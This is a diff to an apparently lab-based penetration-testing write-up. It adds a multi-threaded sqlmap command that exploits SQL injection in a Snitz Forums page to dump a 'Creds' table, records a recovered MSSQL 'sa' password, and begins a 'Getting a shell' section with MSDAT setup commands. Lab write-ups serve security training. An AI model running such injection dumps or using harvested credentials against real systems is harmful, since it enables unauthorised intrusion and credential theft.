@@ -6,6 +6,7 @@
   - [Enumeration](#enumeration)
   - [10.1.3.1 - Gitlab / Jenkins](#10131---gitlab--jenkins)
   - [10.1.3.2 - Snitz Forums](#10132---snitz-forums)
+  - [Getting a shell](#getting-a-shell)
 
 ----
 
@@ -148,5 +149,31 @@ proxychains sqlmap -u "http://10.1.3.2/pop_profile.asp?mode=display&id=1" --head
 Check the table `Creds`:
 
 ```
-proxychains sqlmap -u "http://10.1.3.2/pop_profile.asp?mode=display&id=1" --headers="Authorization: Basic aWlzYWRtaW46SGVhZCEhUyUkI0Ah\nCookie: ASPSESSIONIDCSQSSSRC=JOMBGJJBAPLHBCAKFGBCBFJO" -p id -T U -D Sensitive-DB -T Creds --dump
+proxychains sqlmap -u "http://10.1.3.2/pop_profile.asp?mode=display&id=1" --headers="Authorization: Basic aWlzYWRtaW46SGVhZCEhUyUkI0Ah\nCookie: ASPSESSIONIDCSQSSSRC=JOMBGJJBAPLHBCAKFGBCBFJO" -p id -T U -D Sensitive-DB -T Creds --dump --threads 10
+```
+
+![picture 37](images/20a9e291046b9086a8d36b358dfca3561ced043b454dfbb5e8c426ea1488a913.png)  
+
+- Note that `sa` is the root user of MSSQL database.
+  - `sa` / `SAAdmin!@#$%`
+
+<br/>
+
+## Getting a shell
+
+First on the attacker machine, clone `MSDAT`:<br/>
+https://github.com/quentinhardy/msdat
+
+```
+cd /usr/share && git clone https://github.com/quentinhardy/msdat.git
+```
+
+<br/>
+
+Install the dependencies:
+
+```
+sudo apt-get install freetds-dev 
+sudo pip install cython colorlog termcolor pymssql argparse
+sudo pip install argcomplete && sudo activate-global-python-argcomplete
 ```
